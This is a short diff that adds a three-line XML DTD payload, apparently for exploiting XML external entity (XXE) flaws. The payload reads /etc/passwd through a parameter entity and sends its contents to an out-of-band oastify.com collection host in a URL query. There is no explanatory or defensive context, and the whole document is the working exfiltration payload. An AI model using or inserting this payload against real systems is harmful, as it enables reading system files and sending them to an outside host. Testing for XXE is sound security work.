@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY exfil SYSTEM 'https://bp4xq7i80jvcanx1d5add69is9y0mvak.oastify.com/?data=%file;'>">
+%eval;
